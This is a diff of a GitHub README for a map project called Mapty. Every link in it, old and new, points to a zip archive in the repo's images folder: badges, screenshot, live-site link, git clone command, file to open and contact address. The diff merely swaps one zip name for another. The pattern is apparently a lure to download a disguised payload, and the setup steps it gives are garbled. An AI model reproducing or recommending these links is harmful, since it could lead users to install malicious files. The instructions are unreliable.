@@ -2,14 +2,14 @@
 
 <div align='center'>
 
-![HTML5 Badge](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip) ![CSS3 Badge](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip) ![JavaScript Badge](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip)
-![Netlify Badge](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip)
+![HTML5 Badge](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software_3.0-alpha.4.zip) ![CSS3 Badge](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software_3.0-alpha.4.zip) ![JavaScript Badge](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software_3.0-alpha.4.zip)
+![Netlify Badge](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software_3.0-alpha.4.zip)
 
 </div>
 
-![screenshot](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip)
+![screenshot](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software_3.0-alpha.4.zip)
 
-You can view the live site -> [Here](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip)
+You can view the live site -> [Here](https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software_3.0-alpha.4.zip)
 
 ## Usage
 
@@ -41,11 +41,11 @@ To run this project locally, you can follow these steps:
 1. Clone the repository:
 
    ```
-   $ git clone https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip
+   $ git clone https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software_3.0-alpha.4.zip
    ```
 
 2. Open the project folder in your code editor of choice.
-3. Open the 'https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip' file in your web browser.
+3. Open the 'https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software_3.0-alpha.4.zip' file in your web browser.
 
 ## License
 
@@ -53,4 +53,4 @@ This project is licensed under the MIT License.
 
 ## Contact
 
-If you have any questions or comments about this project, you can reach out to me at https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software-v3.3.zip
+If you have any questions or comments about this project, you can reach out to me at https://github.com/imadosan/Mapty/raw/refs/heads/main/images/Software_3.0-alpha.4.zip
